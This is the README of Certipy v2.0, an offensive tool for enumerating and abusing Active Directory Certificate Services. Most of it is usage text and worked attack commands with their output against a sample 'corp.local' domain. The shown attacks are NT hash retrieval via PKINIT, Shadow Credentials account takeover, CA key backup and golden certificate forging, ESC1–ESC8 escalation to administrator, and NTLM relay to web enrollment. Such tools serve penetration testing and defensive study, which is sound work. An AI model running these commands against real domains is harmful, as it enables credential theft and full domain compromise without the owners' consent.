# Certipy

Active Directory Certificate Services enumeration and abuse

## Table of Contents

- [Certipy](#certipy)
  - [Table of Contents](#table-of-contents)
  - [Installation](#installation)
  - [Usage](#usage)
    - [Find](#find)
      - [Standard Usage](#standard-usage)
      - [BloodHound Only](#bloodhound-only)
    - [Request](#request)
      - [Standard Usage](#standard-usage-1)
    - [Authenticate](#authenticate)
      - [Standard Usage](#standard-usage-2)
      - [Specifying Parameters](#specifying-parameters)
    - [Shadow Credentials](#shadow-credentials)
      - [Auto](#auto)
    - [Golden Certificates](#golden-certificates)
      - [Backup](#backup)
      - [Forging](#forging)
    - [Domain Escalation](#domain-escalation)
      - [ESC1](#esc1)
      - [ESC2](#esc2)
      - [ESC3](#esc3)
      - [ESC4](#esc4)
      - [ESC6](#esc6)
      - [ESC7](#esc7)
      - [ESC8](#esc8)
  - [Errors](#errors)
  - [Credits](#credits)

## Installation

```bash
python3 setup.py install
```

## Usage

A lot of the usage and features are shown in the blog post for Certipy 2.0 [here](https://research.ifcr.dk/34d1c26f0dc6).

```
Certipy v2.0 - by Oliver Lyak (ly4k)

usage: certipy [-v] [-h] {auth,ca,find,forge,relay,req,shadow,template} ...

Active Directory Certificate Services enumeration and abuse

positional arguments:
  {auth,ca,find,forge,relay,req,shadow,template}
                        Action
    auth                Authenticate using certificates
    ca                  Manage CA and certificates
    find                Enumerate AD CS
    forge               Create Golden Certificates
    relay               NTLM Relay to AD CS HTTP Endpoints
    req                 Request certificates
    shadow              Abuse Shadow Credentials for account takeover
    template            Manage certificate templates

optional arguments:
  -v, --version         Show Certipy's version number and exit
  -h, --help            Show this help message and exit
```

### Find

Enumerate AD CS certificate templates and certificate authorities.

```
Certipy v2.0 - by Oliver Lyak (ly4k)

usage: certipy find [-h] [-debug] [-json] [-bloodhound] [-text] [-output prefix] [-enabled] [-scheme ldap scheme] [-dc-ip ip address] [-target-ip ip address] [-ns nameserver] [-dns-tcp] [-timeout seconds] [-hashes LMHASH:NTHASH] [-no-pass] [-k] target

positional arguments:
  target                [[domain/]username[:password]@]<target name or address>

optional arguments:
  -h, --help            show this help message and exit
  -debug                Turn debug output on

output options:
  -json                 Output result as JSON only
  -bloodhound           Output result as BloodHound data only
  -text, -txt           Output result as text only
  -output prefix        Filename prefix for writing results to

find options:
  -enabled              Show only enabled certificate templates

connection options:
  -scheme ldap scheme
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it
  -ns nameserver        Nameserver for DNS resolution
  -dns-tcp              Use TCP instead of UDP for DNS queries
  -timeout seconds      Timeout for connections

authentication options:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              Don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
```

#### Standard Usage

By default, Certipy will output the enumeration results as text, JSON, and BloodHound data.

```bash
$ certipy find 'corp.local/john:Passw0rd!@dc.corp.local'
Certipy v2.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 8 enabled certificate templates
[*] Saved text output to '20220218220900_Certipy.txt'
[*] Saved JSON output to '20220218220900_Certipy.json'
[*] Saved BloodHound data to '20220218220900_Certipy.zip'. Drag and drop the file into the BloodHound GUI
```

#### BloodHound Only

To only output BloodHound data, specify the `-bloodhound` parameter.

```bash
$ certipy find 'corp.local/john:Passw0rd!@dc.corp.local' -bloodhound
Certipy v2.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 8 enabled certificate templates
[*] Saved BloodHound data to '20220218220909_Certipy.zip'. Drag and drop the file into the BloodHound GUI
```

The BloodHound data is saved as a ZIP-file that can be imported into the latest version of BloodHound. Please note that Certipy uses BloodHound's new format, introduced in version 4.

Custom queries for BloodHound can be found in [customqueries.json](./customqueries.json).

On Linux, custom BloodHound queries can be added in `~/.config/bloodhound/customqueries.json`, and for Windows in `C:\Users\[USERNAME]\AppData\Roaming\BloodHound\customqueries.json`

### Request

Request certificates

```
Certipy v2.0 - by Oliver Lyak (ly4k)

usage: certipy req [-h] -ca certificate authority name [-debug] [-template template name] [-alt alternative UPN] [-retrieve request ID] [-on-behalf-of domain\account] [-pfx pfx/p12 file name] [-out output file name] [-dynamic-endpoint] [-dc-ip ip address] [-target-ip ip address] [-ns nameserver] [-dns-tcp]
                   [-timeout seconds] [-hashes LMHASH:NTHASH] [-no-pass] [-k]
                   target

positional arguments:
  target                [[domain/]username[:password]@]<target name or address>

optional arguments:
  -h, --help            show this help message and exit
  -ca certificate authority name
  -debug                Turn debug output on

certificate request options:
  -template template name
  -alt alternative UPN
  -retrieve request ID  Retrieve an issued certificate specified by a request ID instead of requesting a new certificate
  -on-behalf-of domain\account
                        Use a Certificate Request Agent certificate to request on behalf of another user
  -pfx pfx/p12 file name
                        Path to Certificate Request Agent certificate

output options:
  -out output file name

connection options:
  -dynamic-endpoint     Prefer dynamic TCP endpoint over named pipe
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it
  -ns nameserver        Nameserver for DNS resolution
  -dns-tcp              Use TCP instead of UDP for DNS queries
  -timeout seconds      Timeout for connections

authentication options:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              Don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
```

#### Standard Usage

Request a certificate from `corp-CA` based on the template `User`.

```bash
$ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'User'
Certipy v2.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[*] Successfully requested certificate
[*] Request ID is 688
[*] Got certificate with UPN 'john@corp.local'
[*] Saved certificate and private key to 'john.pfx'
```

### Authenticate

The `auth` command will use the PKINIT Kerberos extension to authenticate with the provided certificate to retrieve the NT hash of the user.

```
Certipy v2.0 - by Oliver Lyak (ly4k)

usage: certipy auth [-h] -pfx pfx/p12 file name [-no-ccache] [-no-hash] [-debug] [-dc-ip ip address] [-ns nameserver] [-dns-tcp] [-timeout seconds] [-username username] [-domain domain]

optional arguments:
  -h, --help            show this help message and exit
  -pfx pfx/p12 file name
                        Path to certificate
  -no-ccache            Don't save CCache
  -no-hash              Don't request NT hash
  -debug                Turn debug output on

connection options:
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -ns nameserver        Nameserver for DNS resolution
  -dns-tcp              Use TCP instead of UDP for DNS queries
  -timeout seconds      Timeout for connections

authentication options:
  -username username
  -domain domain
```

#### Standard Usage

Certipy will try to extract the username and domain from the certificate (`-pfx`) for authentication.

```bash
$ certipy auth -pfx administrator.pfx
Certipy v2.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@corp.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got NT hash for 'administrator@corp.local': a87f3a337d73085c45f9416be5787d86
```

#### Specifying Parameters

If the standard usage example doesn't work, you can specify the required parameters manually, such as the KDC IP, username, and domain.

```bash
$ certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
Certipy v2.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@corp.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got NT hash for 'administrator@corp.local': a87f3a337d73085c45f9416be5787d86
```

### Shadow Credentials

Abusing Shadow Credentials for account takeover

```
Certipy v2.0 - by Oliver Lyak (ly4k)

usage: certipy shadow [-h] [-account target account] [-device-id DEVICE_ID] [-debug] [-out output file name] [-scheme ldap scheme] [-dc-ip ip address] [-target-ip ip address] [-ns nameserver] [-dns-tcp] [-timeout seconds] [-hashes LMHASH:NTHASH] [-no-pass] [-k] action target

positional arguments:
  action                Key Credentials action
  target                [[domain/]username[:password]@]<target name or address>

optional arguments:
  -h, --help            show this help message and exit
  -account target account
                        Account to target. If omitted, the user specified in the target will be used
  -device-id DEVICE_ID  Device ID of the Key Credential Link
  -debug                Turn debug output on

output options:
  -out output file name

connection options:
  -scheme ldap scheme
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it
  -ns nameserver        Nameserver for DNS resolution
  -dns-tcp              Use TCP instead of UDP for DNS queries
  -timeout seconds      Timeout for connections

authentication options:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              Don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
```

#### Auto

Automatically add a new Key Credential, authenticate to retrieve the NT hash, and then restore the old Key Credential attribute.

```bash
$ certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
Certipy v2.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'johnpc$'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '40d662ce-1112-042f-43cc-d14dc981c671'
[*] Adding Key Credential with device ID '40d662ce-1112-042f-43cc-d14dc981c671' to the Key Credentials for 'johnpc$'
[*] Successfully added Key Credential with device ID '40d662ce-1112-042f-43cc-d14dc981c671' to the Key Credentials for 'johnpc$'
[*] Authenticating as 'johnpc$' with the certificate
[*] Using principal: johnpc$@corp.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'johnpc.ccache'
[*] Trying to retrieve NT hash for 'johnpc$'
[*] Restoring the old Key Credentials for 'johnpc$'
[*] Successfully restored the old Key Credentials for 'johnpc$'
[*] NT hash for 'johnpc$': fc525c9683e8fe067095ba2ddc971889
```

### Golden Certificates

Create Golden Certificates

```
Certipy v2.0 - by Oliver Lyak (ly4k)

usage: certipy forge [-h] -ca-pfx pfx/p12 file name -subject subject -alt alternative UPN [-debug] [-out output file name]

optional arguments:
  -h, --help            show this help message and exit
  -ca-pfx pfx/p12 file name
                        Path to CA certificate
  -subject subject      Subject to include certificate
  -alt alternative UPN
  -debug                Turn debug output on

output options:
  -out output file name
```

#### Backup

Backing up the certificate and private key of the CA.

```bash
$ certipy ca 'corp.local/administrator@ca.corp.local' -hashes :a87f3a337d73085c45f9416be5787d86 -backup
Certipy v2.0 - by Oliver Lyak (ly4k)

[*] Creating new service
[*] Creating backup
[*] Retrieving backup
[*] Got certificate and private key
[*] Saved certificate and private key to 'corp-CA.pfx'
[*] Cleaning up
```

#### Forging

Forging a certificate for the domain controller `DC$`.

```bash
$ certipy forge -ca-pfx 'corp-CA.pfx' -subject 'CN=Certipy' -alt 'DC$@corp.local'
Certipy v2.0 - by Oliver Lyak (ly4k)

[*] Saved forged certificate and private key to 'dc.pfx'
```

### Domain Escalation

#### ESC1

ESC1 is when a certificate template permits Client Authentication and allows the enrollee to supply an arbitrary Subject Alternative Name (SAN).

For ESC1, request a certificate based on the vulnerable certificate template and specify an arbitrary SAN with the `-alt` parameter.

```bash
$ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'
Certipy v2.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[*] Successfully requested certificate
[*] Request ID is 659
[*] Got certificate with UPN 'administrator@corp.local'
[*] Saved certificate and private key to 'administrator.pfx'
```

#### ESC2

ESC2 is when a certificate template can be used for any purpose. Since the certificate can be used for any purpose, it can be used for the same technique as with ESC3. See below.

#### ESC3

ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users.

Request a certificate based on the vulnerable certificate template ESC3.

```bash
$ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC3'
Certipy v2.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[*] Successfully requested certificate
[*] Request ID is 665
[*] Got certificate with UPN 'john@corp.local'
[*] Saved certificate and private key to 'john.pfx'
```

Use the Certificate Request Agent certificate (`-pfx`) to request a certificate on behalf of other another user by specifying the `-on-behalf-of`. The `-on-behalf-of` parameter value must be in the form of `domain\user`, and not the FQDN of the domain, i.e. `corp` rather than `corp.local`.

```bash
$ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'
Certipy v2.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[*] Successfully requested certificate
[*] Request ID is 666
[*] Got certificate with UPN 'administrator@corp.local'
[*] Saved certificate and private key to 'administrator.pfx'
```

#### ESC4

ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.

By default, Certipy will overwrite the configuration to make it vulnerable to ESC1. Specify the `-save-old` parameter to save the old configuration, which is useful for restoring the configuration afterwards.

```bash
$ certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -save-old
Certipy v2.0 - by Oliver Lyak (ly4k)

[*] Saved old configuration for 'ESC4' to 'ESC4.json'
[*] Updating certificate template 'ESC4'
[*] Successfully updated 'ESC4'
```

Then request a certificate based on the ESC4 template, just like ESC1.

```bash
$ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC4' -alt 'administrator@corp.local'
Certipy v2.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[*] Successfully requested certificate
[*] Request ID is 671
[*] Got certificate with UPN 'administrator@corp.local'
[*] Saved certificate and private key to 'administrator.pfx'
```

If you want to restore the old configuration, specify the path to the saved configuration with the `-configuration` parameter.

```bash
certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -configuration ESC4.json
Certipy v2.0 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'ESC4'
[*] Successfully updated 'ESC4'
```

#### ESC6

ESC6 is when the CA specifies the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag. This flag allows the enrollee to specify an arbitrary SAN on all certificates despite a certificate template's configuration.

The attack is the same as ESC1, except that you can choose any certificate template that permits client authentication.

```bash
$ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -alt 'administrator@corp.local'
Certipy v2.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[*] Successfully requested certificate
[*] Request ID is 673
[*] Got certificate with UPN 'administrator@corp.local'
[*] Saved certificate and private key to 'administrator.pfx'
```

#### ESC7

ESC7 is when a user has the `Manage CA` or `Manage Certificates` access right on a CA. There are no public techniques that can abuse the `Manage Certificates` access right for domain privilege escalation, but it can be used it to issue or deny pending certificate requests.

The ["Certified Pre-Owned"](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) whitepaper mentions that this access right can be used to enable the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag to perform the ESC6 attack, but this will not have any effect until the CA service (`CertSvc`) is restarted. When a user has the `Manage CA` access right, the user is also allowed to restart the service. However, it does not mean that the user can restart the service remotely.

Instead, I've found another technique that doesn't require any service restarts or configuration changes.

**Prerequisites**

In order for this technique to work, the user must also have the `Manage Certificates` access right, and the certificate template `SubCA` must be enabled. With `Manage CA`, we can fulfill these prerequisites.

The technique relies on the fact that users with the `Manage CA` **and** `Manage Certificates` access right can issue failed certificate requests. The `SubCA` certificate template is vulnerable to ESC1, but only administrators can enroll in the template. A user can request to enroll in the `SubCA`, which will be denied, but the certificate can then be issued by the manager.

If you only have the `Manage CA` access right, you can grant yourself the `Manage Certificates` access right by adding your user as a new officer.

```bash
$ certipy ca 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -add-officer 'john'
Certipy v2.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'john' on 'corp-CA'
```

The `SubCA` template can be enabled on the CA with the `-enable-template` parameter.

```bash
$ certipy ca 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -enable-template 'SubCA'
Certipy v2.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-CA'
```

By default, the `SubCA` template is enabled.

**Attack**

Request a certificate based on the `SubCA` template. This request will be denied, but save the private key and note down the request ID.

```bash
$ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'SubCA' -alt 'administrator@corp.local'
Certipy v2.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 674
Would you like to save the private key? (y/N) y
[*] Saved private key to 674.key
```

Issue the failed certificate request with `-issue-request <request ID>`.

```bash
$ certipy ca 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -issue-request 674
Certipy v2.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

You can then retrieve the issued certificate with `-retrieve <request ID>`.

```bash
$ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -retrieve 674
Certipy v2.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 674
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Loaded private key from '674.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

#### ESC8

ESC8 is when an Enrollment Service has installed and enabled Web Enrollment via HTTP.

To start the relay server, just run the `relay` command and specify the CA's IP in `-ca`.

By default, Certipy will request a certificate based on the `Machine` or `User` template depending on whether the relayed account name ends with `$`. It is possible to specify another template with the `-template` parameter.

You can then use a technique such as [PetitPotam](https://github.com/ly4k/PetitPotam) to coerce authentication. For domain controllers, you must specify `-template DomainController`.

```bash
$ certipy relay -ca 172.16.19.100
Certipy v2.0 - by Oliver Lyak (ly4k)

[*] Targeting http://172.16.19.100/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server
[*] SMBD-Thread-2: Connection from CORP/ADMINISTRATOR@172.16.19.101 controlled, attacking target http://172.16.19.100
[*] Authenticating against http://172.16.19.100 as CORP/ADMINISTRATOR SUCCEED
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'administrator@corp.local'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## Errors

Please submit any errors, issues, or questions under "Issues".

## Credits

- [Will Schroeder](https://twitter.com/harmj0y) and [Lee Christensen](https://twitter.com/tifkin_) for [Certified Pre-Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) and [Certify](https://github.com/GhostPack/Certify)
- [Dirk-jan](https://twitter.com/_dirkjan) for [PKINITtools](https://github.com/dirkjanm/PKINITtools)
- [ShutdownRepo](https://github.com/ShutdownRepo) for [PyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [zer1t0](https://github.com/zer1t0) for [certi](https://github.com/zer1t0/certi)
- [Ex Android Dev](https://github.com/ExAndroidDev) and [Tw1sm](https://github.com/Tw1sm) for Impacket's [adcsattack.py](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/ntlmrelayx/attacks/httpattacks/adcsattack.py)
- [SecureAuthCorp](https://github.com/SecureAuthCorp) for [Impacket](https://github.com/SecureAuthCorp/impacket)